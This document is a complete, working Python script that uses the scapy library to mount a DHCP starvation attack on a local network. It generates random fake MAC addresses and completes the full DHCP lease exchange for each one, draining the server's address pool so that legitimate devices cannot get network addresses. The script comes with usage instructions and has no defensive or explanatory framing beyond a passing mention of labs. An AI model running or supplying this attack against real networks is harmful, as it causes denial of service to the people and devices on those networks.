#!/usr/bin/env python3
from scapy.all import *
import random, sys, time

# Usage: sudo python3 dhcp_starvation.py <iface> <count>
# Example: sudo python3 dhcp_starvation.py eth0 300

if len(sys.argv) < 2:
    print("Usage: sudo python3 dhcp_starvation.py <iface> [count]")
    sys.exit(1)

iface = sys.argv[1]
count = int(sys.argv[2]) if len(sys.argv) >= 3 else 300

conf.checkIPaddr = False  # important in some labs

def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))

def do_dora(fake_mac):
    xid = random.randint(1, 0xFFFFFFFF)

    discover = (Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac2str(fake_mac), xid=xid) /
                DHCP(options=[("message-type","discover"), ("param_req_list",[1,3,6,15,51,54]), "end"]))

    offer = srp1(discover, iface=iface, timeout=1, verbose=0)
    if offer is None or not offer.haslayer(DHCP):
        return None

    offered_ip = offer[BOOTP].yiaddr

    request = (Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
               IP(src="0.0.0.0", dst="255.255.255.255") /
               UDP(sport=68, dport=67) /
               BOOTP(chaddr=mac2str(fake_mac), xid=xid) /
               DHCP(options=[("message-type","request"),
                            ("requested_addr", offered_ip),
                            ("server_id", offer[IP].src),
                            "end"]))

    ack = srp1(request, iface=iface, timeout=1, verbose=0)
    if ack is None:
        return None
    return offered_ip

print(f"[*] Starting starvation on {iface} for ~{count} leases...")
got = 0
for i in range(count):
    mac = rand_mac()
    ip = do_dora(mac)
    if ip:
        got += 1
        print(f"[+] {got:03d}: {mac} got {ip}")
    time.sleep(0.02)

print(f"[*] Done. Leases obtained: {got}")
                                            